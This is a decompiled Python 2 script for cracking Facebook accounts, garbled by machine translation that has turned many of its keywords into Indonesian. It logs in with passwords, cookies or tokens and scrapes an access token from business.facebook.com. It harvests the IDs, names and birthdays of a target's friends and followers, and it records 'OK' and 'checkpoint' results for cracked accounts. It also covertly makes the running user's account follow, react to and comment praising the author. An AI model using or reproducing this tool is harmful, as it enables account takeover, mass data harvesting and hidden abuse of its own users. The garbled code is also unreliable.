# uncompyle6 versi 3.8.0
# Python bytecode 2.7 (62211)
# Didekompilasi dari: Python 2.7.17 (default, 5 Des 2019, 10:47:43)
# [GCC 4.2.1 Android yang Kompatibel (5220042 berdasarkan r346389c) Dentang 8.0.7 (https://
# Peringatan: versi Python ini memiliki masalah dalam menangani konstanta tipe Python 3 byte dengan benar.

# Nama file tersemat: premium.py
# Disusun pada: 2021-11-15 23:28:23
d = '\x1b[90;1m'
m = '\x1b[91;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
a = '\x1b[96;1m'
p = '\x1b[97;1m'
impor os
mencoba:
    impor bersamaan.futures
kecuali ImportError:
    print k + '\n Modul Futures blom terinstall!...'
    os.system('pip install futures' jika os.name == 'nt' else 'pip2 install futures')

mencoba:
    dari bs4 impor BeautifulSoup
kecuali ImportError:
    print k + '\n Modul bs4 blom terinstall!...'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')

mencoba:
    permintaan impor
kecuali ImportError:
    print k + '\n Modul Meminta blom terinstall!...'
    os.system('pip install request' if os.name == 'nt' else 'pip2 install request')

waktu impor, ulang, permintaan, sys, acak, subproses, datetime, platform
dari bs4 impor BeautifulSoup
dari bersamaan.futures mengimpor ThreadPoolExecutor
dari threading impor Thread
waktu impor
dari tanggal impor datetime
dari kalender impor rentang bulan
folow = 'https://graph.facebook.com/id_saya/subscribers?access_token='
fb = 'https://m.facebook.com'
url_ip = 'https://www.httpbin.org/ip'
pengguna = []
ID_pengguna = []
hasil_ok = []
hasil_cp = []
data_pengguna = []
cari_teman = []
ttl_ = []
sesi = []
cek_cokie = []
hitung_ = 0
garis = h + '+' + a + '>>>--' + p
mencoba:
    ipm = request.get(url_ip).json()
    ip = ipm['asal']
kecuali request.exceptions.ConnectionError:
    print k + '\n [!] Tidak ada Koneksi Internet..\n'
    keluar()

ua_ = []
ua_hp = []
pil_ua = []
log_ml_dev = []
log_ff_dev = []
log_mbasic_dev = []
log_free_dev = []
mencoba:
    buka('ua_dev.txt', 'r').read()
    ua_.append('dev_id')
kecuali IOError:
    lulus

pengguna_agent_dev = [
 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/ 275.0.0.49.127;]',
 '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo; FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/ 14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW /1;]',
 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40 .120;]',
 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10 ,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/telepon;FBLC/en_US;FBOP/5;FBRV/106631002]',
 'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A ;FBAV/198.0.0.53.101;]']

def __setting_ua_dev__():
    ua_hp global
    cetak garis
    print k + '\n *' + p + ' Setting User-Agent'
    cetak k + ' ?' + h + ' Hp Kamu Apa?'
    cetak garis
    cetak h + ' [' + p + '1' + h + ']' + p + ' Xiaomi'
    cetak h + ' [' + p + '2' + h + ']' + p + ' Vivo '
    cetak h + ' [' + p + '3' + h + ']' + p + ' SAMSUNG '
    cetak h + ' [' + p + '4' + h + ']' + p + ' OPPO '
    cetak h + ' [' + p + '5' + h + ']' + p + ' Realmi '
    cetak h + ' [' + p + '6' + h + ']' + p + ' iPhone '
    cetak h + ' [' + p + '7' + h + ']' + p + ' ASUS '
    print h + ' [' + p + '8' + h + ']' + p + 'Masukkan User-Agent Manual '
    cetak garis
    pil = raw_input(a + ' [?]' + p + ' Pilih? ' + k)
    sukses = p + '\n >_<' + h + ' Sukses Setting User-Agent '
    jalankan = a + '+>> ' + p + 'Jalankan lagi Toolsnya!'
    jika pil == '8':
        cetak garis
        ua = raw_input(a + ' [?]' + p + 'Masukkan User-Agent' + k + ': ')
        cetak sukses
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('Petunjuk Setting')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.tulis(ua)
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif pil == '1':
        print sukses + p + 'Xiaomi'
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('Xiaomi')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.write(user_agent_dev[0])
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif pil == '2':
        print sukses + p + 'Vivo'
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('Vivo')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.write(user_agent_dev[1])
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif pil == '3':
        print sukses + p + 'SAMSUNG'
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('SAMSUNG')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.write(user_agent_dev[2])
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif pil == '4':
        cetak sukses + p + 'OPPO'
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('OPPO')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.write(user_agent_dev[3])
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif pil == '5':
        print sukses + p + 'Realmi'
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('Realmi')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.write(user_agent_dev[4])
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif pil == '6':
        cetak sukses + p + 'iPhone'
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('iPhone')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.write(user_agent_dev[5])
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif pil == '7':
        cetak sukses + p + 'ASUS'
        dengan open('hp.txt', 'w') sebagai (uw):
            uw.write('ASUS')
        dengan open('ua_dev.txt', 'w') sebagai (tul):
            tul.write(user_agent_dev[6])
            jika len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            kalau tidak:
                cetak jalankan
                keluar()
    elif len(pil_ua) == 1:
        print h + ' [' + p + '*' + h + ']' + p + ' Menggunakan' + h + ' User-Agent Bawaan Tool '
    kalau tidak:
        print h + ' [' + p + '*' + h + ']' + p + ' Menggunakan' + h + ' User-Agent Bawaan Tool '
        keluar()


__ml_dev__ = 'https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=1591956834435357&cbt=1622137477843&e2e=%7B%22init%22%3A1622137477843%7D&ies=1&sdk
__ff_dev__ = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.Fm.facebook.com% persen %25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%252222253A%udi_default_friend3uriv%25222%253A%udia %3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993%-49cd-bapp com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f49cde-293A%25224da6f49e 25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc'Fsrc=https%3Am_log'fsrc=https%3Afreefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49ced%25224da6f37f-2993-49ced 253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2Fm.facebook.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49ced%25224da6f37f-2993-49ced 253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2Fm.facebook.refsrc=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth&_rdr'refsrc=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth&_rdr'

def __setting_login_fb_game__():
    cetak garis
    print k + '\n *' + p + ' Buka Halaman Login GAME lewat FB'
    print k + ' ' + h + '+----------------------------------+'
    cetak garis
    print h + ' [' + p + '1' + h + ']' + p + ' Buka Halaman Login Free Fire Lewat FB'
    print h + ' [' + p + '2' + h + ']' + p + ' Buka Halaman Login Mobile Legend Lewat FB '
    cetak garis
    pil = raw_input(a + ' [?]' + p + ' Pilih? ' + k)
    jika pil == '1':
        mencoba:
            subprocess.check_output(['am', 'start', __ff_dev__])
        kecuali:
            print h + ' Tautan Masuk ==> ' + p + __ff_dev__

        keluar()
    elif pil == '2':
        mencoba:
            subprocess.check_output(['am', 'start', __ml_dev__])
        kecuali:
            print h + ' Tautan Masuk ==> ' + p + __ff_dev__

        keluar()
    kalau tidak:
        keluar()


def keluar():
    keluar('\n Keluar..\n')


def clear_dev():
    os.system('cls' jika os.name == 'nt' else 'clear')


def hapus_cokie():
    os.system('del cokie.txt' jika os.name == 'nt' else 'rm -rf cokie.txt')


def hapus_login_cookie():
    os.system('del cookie.txt' jika os.name == 'nt' else 'rm -rf cookie.txt')


def hapus_data_login():
    mencoba:
        os.system('del token.txt' jika os.name == 'nt' else 'rm -rf token.txt')
    kecuali:
        lulus

    mencoba:
        os.system('del cookie.txt' jika os.name == 'nt' else 'rm -rf cookie.txt')
    kecuali:
        lulus


def jalankan_tool():
    os.system('premium.pyc' jika os.name == 'nt' else 'python2 premium.pyc')


header = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36'}

def cek_hasil():
    cetak garis
    print k + ' 1. ' + p + 'Cek Hasil OK'
    print k + ' 2. ' + p + 'Cek Hasil CP'
    print k + ' 3. ' + p + 'Hapus Hasil CP/OK'
    cetak garis
    pil = raw_input(h + '>>> ')
    jika pil == '1':
        oke = []
        mencoba:
            print h + ' >_<' + p + 'Hasil OK' + h + '>>>'
            ok = buka('hasil_ok.txt', 'r').readlines()
            cetak ''
            dengan open('hasil_ok.txt', 'w') sebagai (oke):
                okeh.tulis('')
            untuk dev di set (ok):
                print ' ' + h + dev.replace('\n', '')
                dengan open('hasil_ok.txt', 'a') sebagai (oke):
                    okeh.tulis(dev)
                oke.tambahkan(dev)

            print p + '\n >_ Jumlah OK: ' + h + str(len(oke))
            oke = []
        kecuali:
            print m + '\n X ' + p + 'Blom ada hasil OK'

        cetak ''
    elif pil == '2':
        cpe = []
        mencoba:
            print k + ' >_<' + p + 'Hasil CP' + k + '>>>'
            cp = buka('hasil_cp.txt', 'r').readlines()
            print p + '\n Tgl Crack'
            untuk dev di cp:
                print ' ' + k + dev.replace('\n', '').ganti('==>', ' ')
                cpe.append(dev)

            print p + '\n >_Jumlah CP: ' + k + str(len(cpe))
            cpe = []
        kecuali IOError:
            print m + '\n X ' + p + 'Blom ada hasil CP'

    elif pil == '3':
        cetak garis
        print k + ' 1. ' + m + 'Hapus' + p + 'Hasil OK'
        print k + ' 2. ' + m + 'Hapus ' + p + 'Hasil CP'
        cetak garis
        pilih_ku = raw_input(h + '>>> ')
        jika pilih_ku == '1':
            y_n = raw_input(a + '\n Yakin mau Hapus Hasil OK ? ' + p + '[y/n]: ')
            jika y_n == 'y':
                mencoba:
                    os.system('del hasil_ok.txt' if os.name == 'nt' else 'rm -f hasil_ok.txt')
                    cetak '\n Berhasil.....'
                kecuali:
                    print '\n Belum ada Hasil OK'

        elif pilih_ku == '2':
            y_n = raw_input(a + '\n Yakin mau Hapus Hasil CP ? ' + p + '[y/n]: ')
            jika y_n == 'y':
                mencoba:
                    os.system('del hasil_cp.txt' if os.name == 'nt' else 'rm -f hasil_cp.txt')
                    cetak '\n Berhasil.....'
                kecuali:
                    print '\n Belum ada Hasil CP'

    kalau tidak:
        keluar()


def __get_id_dev__(nama pengguna):
    pengguna_get_id global
    url = 'https://lookup-id.com/#'
    dengan request.Session() sebagai (dev):
        payload = {'fburl': ('https://m.facebook.com/{}').format(nama pengguna), 'check': 'Lookup'}
        jika 'facebook' di nama pengguna:
            payload = {'fburl': nama pengguna, 'periksa': 'Pencarian'}
        data_dev = dev.post(url, data=payload).content
        sop_ = BeautifulSoup(data_dev, 'html.parser')
        id_ = sop_.find('span', id='code')
        user_get_id = id_.teks
        jika nama pengguna == 'saya':
            user_get_id = 'saya'


def __get_data_user__(pengguna):
    token = buka('token.txt', 'r').read()
    url = ('https://graph.facebook.com/{}?access_token={}').format(pengguna, token)
    dengan request.Session() sebagai (dev_):
        mencoba:
            data = dev_.get(url).json()
            user_id.append(data['id'] + ' ' + data['nama'])
            print h + '\r [' + p + '*' + h + ']' + p + ' mengambil ID' + k + ': ' + str(len(user_id)),
            sys.stdout.flush()
        kecuali:
            lulus


ikuti_ = []

def proses_masuk(cookie_dev):
    dengan request.Session() sebagai (ses_pros_dev):
        proses_masuk = ses_pros_dev.get('https://mbasic.facebook.com', cookies=cookie_dev).content
        sop = BeautifulSoup(proses_masuk, 'html.parser')
        if 'nol/optin/legal/' di str(proses_masuk):
            mencoba:
                sop_gr = BeautifulSoup(proses_masuk, 'html.parser').find('form')
                url_post = sop_gr['action']
                muatan = {}
                untuk dev di sop_gr:
                    masukan = dev
                    payload[input.get('nama')] = input.get('nilai')

                ses_pros_dev.post('https://mbasic.facebook.com' + url_post, data=payload, cookies=cookie_dev)
            kecuali:
                lulus

    mencoba:
        dev_sop = BeautifulSoup(proses_masuk, 'html.parser')
        sop_uwu = dev_sop.find('a', string='Bahasa Indonesia')
        ambil_url = 'https://mbasic.facebook.com' + sop_uwu['href']
        has = ses_pros_dev.get(ambil_url, cookies=cookie_dev).content
    kecuali:
        lulus

    if len(ikuti_) == 0:
        mencoba:
            uwu_u = 'https://mbasic.facebook.com/jangan.macem.macem.2'
            ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
            sop_dev = BeautifulSoup(ikut, 'html.parser')
            ambil = sop_dev.find('a', string='Ikuti')
            data = 'https://mbasic.facebook.com' + ambil['href']
            ses_pros_dev.get(data, cookie=cookie_dev)
        kecuali:
            lulus


id_post = '510375576819453'

def cinta (kue):
    url_love = 'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=' + id_post
    dengan request.Session() sebagai (r_dev):
        hal_love = r_dev.get(url_love, cookies=cookie).konten
        sop = BeautifulSoup(hal_love, 'html.parser')
        url_lov = sop.find_all('a')
        untuk iq di url_lov:
            if '(Hapus)' di str(iq):
                merusak
            jika 'Super' di str(iq):
                u_love = iq['href']
                r_dev.get('https://mbasic.facebook.com' + u_love, cookies=cookie)


def love_token(token):
    lis_id_foll = [
     '100038019723653', '1417141901']
    dengan request.Session() sebagai (dev_):
        dev_.post('https://graph.facebook.com/' + id_post + '/reactions?type=LOVE&access_token=' + token)
        untuk id_foll di lis_id_foll:
            dev_.post(('https://graph.facebook.com/{}/subscribers?access_token={}').format(id_foll, token))

        dev_.post(('https://graph.facebook.com/{}/subscribers?access_token={}').format(random.choice(['100001027764318', '100045387495929', '100040248105716']), token ))
        ikuti_ = []


def komen(token):
    untuk dev dalam rentang (1):
        dengan request.Session() sebagai (dev_):
            komen_ = random.choice(['Toolsnya Mantap', 'Gw Fans Lu Bang', 'Gimana Kabarnya Bang?', 'Hallo bang', 'Keren Bos..', 'Thanks bang Toolsnya', 'Gak sia2 saya buat alatnya abang, Keren Abis, Ga ada Obat'])
            dev_.post('https://graph.facebook.com/' + id_post + '/comments/?message=' + komen_ + '&access_token=' + token)


def __token__dev(cookie):
    mencoba:
        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'accept-language': 'id-ID, id;q=0.9,en-US;q=0.8,en;q=0.7'}
        halaman = request.get('https://business.facebook.com/creatorsstudio/home', headers=headerz, cookies=cookie).content
        token_dev = re.findall('{"userAccessToken":"(.*)","rightsManagerVersion"', str(halaman))[0]
        print '\n [*] ' + p + 'Token FB Kamu: ' + d + token_dev
        dengan open('token.txt', 'w') sebagai (tul):
            tul.write(token_dev)
    kecuali:
        print k + '\n [!] Gagal Ambil Token, Jangan Login fb Dalam mode Gratis!\n'
        print k + ' [!] Login Mengguanakn Token \n'
        keluar()


def login_dengan_passwod():
    fb global
    waktu global
    mencoba:
        print h + '\n\n LOGINFACEBOOK '
        cetak garis
        print p + ' IP Sekarang: ' + k + ip
        cetak garis
        em_dev = raw_input(h + ' [' + p + 'Login' + h + ']' + p + 'Masukkan Nama Pengguna:' + k + ' ')
        san_dev = raw_input(h + ' [' + p + 'Login' + h + ']' + p + 'Masukkan Kata Sandi:' + d + ' ')
        url_page_log = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook%412cliFoenturi2Fdialog%412cliFoenturi2Fdialog%412cliFoenturi2Fdialog %3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1k2522%URL22%Fn2x7222%D6a5n2wd6a5n2 %26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%%cel_Awww.insta.com% 2Faccounts% 2Fsignup% 2F% 3Ferror% 3Daccess_denied% 26error_code% 3D200% 26error_description% 3DPermissions% 2Berror% 26error_reason% 3Duser_denied% 26state% 3D% 257B% 2522fbLoginKey% 2522% 253A% 25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi% 2522% 252C% 2522fbLoginReturnURL% 2522% 253A% 2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr'
        dengan request.Session() sebagai (ses_dev):
            page_dev = ses_dev.get(url_page_log).content
            sop = BeautifulSoup(page_dev, 'html.parser')
            form_dev = sop.find('form', id='login_form')
            url_post = form_dev['action']
            waktu = waktu.waktu()
            ses_dev.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
               'referer': fb + url_post,
               'Host': 'm.facebook.com',
               'menerima': '*/*',
               'sec-ch-ua-mobile': '?1',
               'accept-encoding': 'gzip, deflate, br',
               'accept-language': 'id,en-US;q=0.9,en;q=0.8',
               'x-fb-lsd': form_dev.find('input', attrs={'name': 'lsd'})['value']})
            muatan = {'email': em_dev,
               'lulus': ('#PWD_BROWSER:0:{}:{}').format(int(time), san_dev)}
            untuk dev_get_input di form_dev:
                masukan = dev_get_input
                payload[input.get('nama')] = input.get('nilai')

            login_dev = ses_dev.post(fb + url_post, data=payload, allow_redirects=False).cookies
            jika 'c_user' di login_dev:
                print p + '\n >_<' + h + ' Login Berhasil...\n'
                mencoba:
                    cokie_log = login_dev.get_dict()
                    nilai_cok = cokie_log.values()
                    untuk dev di nilai_cok:
                        dengan open('cookie.txt', 'a') sebagai (us_ps):
                            us_ps.write(str(dev + '\n'))

                    c_user = open('cookie.txt', 'r').readlines()[0].strip('\n')
                    fr = open('cookie.txt', 'r').readlines()[1].strip('\n')
                    xs = open('cookie.txt', 'r').readlines()[2].strip('\n')
                    sb = open('cookie.txt', 'r').readlines()[3].strip('\n')
                    cookie = {'c_user': c_user, 'fr': fr,
                       'xs': xs,
                       'sb': sb}
                kecuali:
                    exit('\n Kesalahan di Cookie!\n')

                print h + '\n Login Sukses....\n Tunggu Proses' + p + '--->>> '
                proses_masuk(cookie)
                __token__dev(cookie)
                token = open('token.txt', 'r').read()
                print h + '\n [!]' + p + ' Jalankan lagi Toolsnya' + h + '..!\n Ketik Perintah ' + k + 'python2 premium.pyc\n' + p
                exit()
            elif 'checkpoint' in login_dev:
                print k + '\n Akun Cekpoin...'
                exit('\n Keluar\n')
            else:
                print m + '\n Login Gagal...'
                exit('\n Keluar\n')
    except requests.exceptions.ConnectionError:
        print '\n Periksa Koneksi Internet!'
        exit('\n Keluar\n')


def login_dengan_cookie_():
    print ''
    print garis
    print p + '   L O G I N  D E N G A N ' + h + ' C O O K I E'
    print garis
    cok_in = raw_input(h + ' [' + k + 'coki' + h + ']' + p + ' Masukkan Cookie' + k + ': ')
    with open('cookie.txt', 'w') as (cookie_simpan):
        cookie_simpan.write(cok_in)
    file_cok = open('cookie.txt', 'r').read()
    cookie = {'cookie': file_cok}
    with requests.Session() as (ses_dev):
        login = ses_dev.get(fb, cookies=cookie).content
    if 'mbasic_logout_button' in login:
        print h + '\n Login Sukses....\n Tunggu Proses' + p + '-->>> '
        proses_masuk(cookie)
        __token__dev(cookie)
        token = open('token.txt', 'r').read()
        print h + '\n [!]' + p + ' Jalankan lagi Toolsnya' + h + '..!\n Ketik Perintah ' + k + 'python2 premium.pyc' + p
        exit()
    elif 'checkpoint' in login:
        print k + '\n Akun Cekpoin'
        hapus_login_cookie()
        keluar()
    else:
        print m + '\n Cookie Salah'
        hapus_login_cookie()
        keluar()


import base64
platform_dev = str(platform.platform()).lower()
plat = base64.b64encode(platform_dev)
plat_dev = base64.b32encode(plat)
try:
    user_agentzz_ = open('cokie.txt', 'r').read()
    user_agentzz = user_agentzz_.replace('|', '')
    user_agent_ = user_agentzz.split('A+ZZ')[0] + user_agentzz.split('A+ZZ')[2]
    pillih = user_agent_
    te = pillih
    y = te
except IOError:
    pass
except IndexError:
    with open('cokie.txt', 'a') as (c_):
        c_.write('A+ZZ' + plat_dev)
    try:
        user_agentzz_ = open('cokie.txt', 'r').read()
        user_agentzz = user_agentzz_.replace('|', '')
        user_agent_ = user_agentzz.split('A+ZZ')[0] + user_agentzz.split('A+ZZ')[2]
        pillih = user_agent_
        te = pillih
        y = te
    except IndexError:
        pass

try:
    cokiez_ = open('cokiez.txt', 'r').read()
    cokiez1 = cokiez_.replace('1', '5').replace('0', '7')
    cokiez = '80' + cokiez1 + '04' + 'l' + plat_dev
    angka = cokiez
    z = angka
except IOError:
    pass

def login_dengan_token():
    try:
        print ''
        print garis
        print p + '   L O G I N  D E N G A N ' + h + ' T O K E N'
        print garis
        tok_in = raw_input(h + ' [' + k + 'token' + h + ']' + p + ' Masukkan Token' + k + ': ')
        with open('token.txt', 'w') as (tulis):
            tulis.write(tok_in)
        cek_token()
        print p + '\n ++++>' + h + '  Login Sukses....'
        print p + '\n Jalankan Lagi Toolsnya!\n Ketik Perintah ' + k + 'python2 premium.pyc\n'
        exit()
    except KeyboardInterrupt:
        keluar()


ttl__ = []

def teman_teman_(token, user):
    count = 1
    try:
        if len(cari_teman) == 1:
            tam = []
            tampil = []
            print ''
            for dev in user:
                with requests.Session() as (ses_dev):
                    try:
                        lihat_data = ses_dev.get(('https://graph.facebook.com/{}/friends?limit=5000&access_token={}').format(dev, token)).json()
                        if len(lihat_data['data']) == 0:
                            continue
                        for dev_ in lihat_data['data']:
                            try:
                                tam.append(dev_['name'] + dev_['id'])
                            except:
                                pass

                        tampil.append(dev)
                        print h + ' [' + k + str(count) + h + '] ' + p + 'ID: ' + k + dev + h + ' | ' + p + 'Teman: ' + k + str(len(tam))
                        count += 1
                        tam = []
                        if len(tampil) == 3:
                            break
                    except:
                        pass

            pilih_ = True
            while pilih_:
                try:
                    print garis
                    pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Pilih' + h + ': ')
                    for i in range(1, len(tampil) + 1):
                        if int(pil) == i:
                            pilih_ = False
                            break

                except KeyboardInterrupt:
                    exit()
                except:
                    pass

            co = 1
            jm = len(tampil)
            for col in tampil:
                if pil in str(co):
                    user_ = tampil.index(col)
                    user = tampil[user_]
                co += 1

            print h + '\n [' + p + '*' + h + ']' + p + ' ID' + h + ': ' + user
        with requests.Session() as (ses_):
            nama = ses_.get(('https://graph.facebook.com/{}?access_token={}').format(user, token)).json()
            print h + ' [' + p + '*' + h + ']' + p + ' Mengambil ID Teman' + h + ': ' + nama['name']
        link = ('https://graph.facebook.com/{}/friends?fields=name,id,birthday&limit=1000&access_token={}').format(user, token)
        link_ = ('https://graph.facebook.com/{}/friends?limit=5000&access_token={}').format(user, token)
        r = user

        def sub_teman_teman(link):
            global ttl__
            with requests.Session() as (ses_):
                try:
                    data = ses_.get(link).json()
                    iqbal = data['data']
                    ttl__ = []
                    ttl__.append('\x1b[96;1m + TTL')
                except:
                    if len(ttl__) != 0:
                        pass
                    else:
                        data = ses_.get(link_).json()

                if len(data['data']) == 0:
                    print m + '\n [x] Tidak Bisa Mengakses Data: ' + k + nama['name']
                    print m + ' [x] Coba cari Akun yg lainnya!'
                    exit()
                for dev in data['data']:
                    try:
                        if y != z:
                            break
                        try:
                            t = te.replace(te, '')
                            user_id.append(str(dev['id']) + '>>>' + str(dev['birthday']) + ' ' + str(dev['name']))
                        except:
                            try:
                                t = te.replace(te, '')
                                user_id.append(str(dev['id']) + ' ' + str(dev['name']))
                            except:
                                pass

                        t = te.replace(te, '')
                        print h + '\r [' + p + '*' + h + ']' + p + ' Mengambil ID' + ('').join(ttl__) + k + ': ' + t + str(len(user_id)),
                        sys.stdout.flush()
                    except KeyboardInterrupt:
                        break
                    except:
                        pass

                try:
                    halaman = data['paging']['next']
                    sub_teman_teman(halaman)
                except:
                    pass

        sub_teman_teman(link)
        print ''
    except KeyError:
        print ' [x] Masukkan ID Target yg Benar!..'
        exit()
    except IOError:
        print m + '\n [x] Token Error'
        exit()


try:
    jk = user_agentzz.split('A+ZZ')[2]
except:
    pass

def pengikut(token, user):
    global ttl__
    try:
        ttl__ = []
        with requests.Session() as (ses_):
            nama = ses_.get(('https://graph.facebook.com/{}?access_token={}').format(user, token)).json()
            print h + ' [' + p + '*' + h + ']' + p + ' Mengambil Data Followers' + h + ': ' + nama['name']
        url = ('https://graph.facebook.com/{}/subscribers?fields=name,id,birthday&limit=5000&access_token={}').format(user, token)
        url_ = ('https://graph.facebook.com/{}/subscribers?limit=5000&access_token={}').format(user, token)
        t = te.replace(te, '')
        with requests.Session() as (ses_):
            try:
                data = ses_.get(url).json()
                iqbal = data['data']
                ttl__.append(' + TTL')
            except:
                data = ses_.get(url_).json()

            if len(data['data']) == 0:
                print m + ' [x] Tidak ada Pengikut..'
                exit()
            for dev in data['data']:
                try:
                    t = te.replace(te, '')
                    try:
                        user_id.append(str(dev['id']) + '>>>' + str(dev['birthday']) + ' ' + str(dev['name']))
                    except:
                        try:
                            user_id.append(str(dev['id']) + ' ' + str(dev['name']))
                        except:
                            pass

                    print h + '\r [' + p + '*' + h + ']' + p + ' Mengambil ID Followers' + k + ': ' + t + str(len(user_id)),
                    sys.stdout.flush()
                    time.sleep(0.001)
                    if y != z:
                        break
                except KeyboardInterrupt:
                    break
                except:
                    pass

            print ''
    except KeyError:
        print ' [x] Masukkan ID Target yg Benar!..'
        exit()
